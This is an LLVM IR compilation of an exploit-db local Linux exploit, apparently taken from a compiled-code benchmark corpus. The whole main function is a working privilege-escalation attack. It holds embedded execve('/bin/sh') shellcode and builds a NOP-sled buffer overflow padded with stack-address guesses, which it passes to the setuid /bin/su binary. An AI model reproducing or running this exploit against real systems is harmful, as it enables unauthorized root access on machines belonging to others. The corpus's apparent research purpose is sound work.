; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19360.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19360.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shell = private unnamed_addr constant [51 x i8] c"\EB$^\8D\1E\89^\0B3\D2\89V\07\89V\0F\B8\1BV4\125\10V4\12\8DN\0B\8B\D1\CD\803\C0@\CD\80\E8\D7\FF\FF\FF_bin_sh\00", align 16
@.str = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [51 x i8], align 16
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64*, align 8
  %9 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %10 = bitcast [51 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([51 x i8], [51 x i8]* @__const.main.shell, i32 0, i32 0), i64 51, i1 false)
  %11 = call i8* @malloc(i32 2056)
  store i8* %11, i8** %6, align 8
  store i8* %11, i8** %7, align 8
  %12 = icmp eq i8* %11, null
  br i1 %12, label %13, label %15

13:                                               ; preds = %2
  %14 = call i32 @exit(i32 -1) #4
  unreachable

15:                                               ; preds = %2
  %16 = load i8*, i8** %7, align 8
  %17 = call i32 @memset(i8* %16, i32 144, i32 2028)
  %18 = getelementptr inbounds [51 x i8], [51 x i8]* %5, i64 0, i64 0
  %19 = call i32 @strlen(i8* %18)
  %20 = sub nsw i32 2028, %19
  %21 = load i8*, i8** %7, align 8
  %22 = sext i32 %20 to i64
  %23 = getelementptr inbounds i8, i8* %21, i64 %22
  store i8* %23, i8** %7, align 8
  store i32 0, i32* %9, align 4
  br label %24

24:                                               ; preds = %36, %15
  %25 = load i32, i32* %9, align 4
  %26 = getelementptr inbounds [51 x i8], [51 x i8]* %5, i64 0, i64 0
  %27 = call i32 @strlen(i8* %26)
  %28 = icmp slt i32 %25, %27
  br i1 %28, label %29, label %39

29:                                               ; preds = %24
  %30 = load i32, i32* %9, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [51 x i8], [51 x i8]* %5, i64 0, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = load i8*, i8** %7, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %7, align 8
  store i8 %33, i8* %34, align 1
  br label %36

36:                                               ; preds = %29
  %37 = load i32, i32* %9, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %9, align 4
  br label %24

39:                                               ; preds = %24
  %40 = load i8*, i8** %7, align 8
  %41 = bitcast i8* %40 to i64*
  store i64* %41, i64** %8, align 8
  store i32 0, i32* %9, align 4
  br label %42

42:                                               ; preds = %50, %39
  %43 = load i32, i32* %9, align 4
  %44 = icmp slt i32 %43, 7
  br i1 %44, label %45, label %53

45:                                               ; preds = %42
  %46 = call i32 (...) @get_esp()
  %47 = sext i32 %46 to i64
  %48 = load i64*, i64** %8, align 8
  %49 = getelementptr inbounds i64, i64* %48, i32 1
  store i64* %49, i64** %8, align 8
  store i64 %47, i64* %48, align 8
  br label %50

50:                                               ; preds = %45
  %51 = load i32, i32* %9, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %9, align 4
  br label %42

53:                                               ; preds = %42
  %54 = load i64*, i64** %8, align 8
  %55 = bitcast i64* %54 to i8*
  store i8* %55, i8** %7, align 8
  %56 = load i8*, i8** %7, align 8
  store i8 0, i8* %56, align 1
  %57 = load i8*, i8** %6, align 8
  %58 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* %57, i32* null)
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i8* @malloc(i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @get_esp(...) #2

declare dso_local i32 @execl(i8*, i8*, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
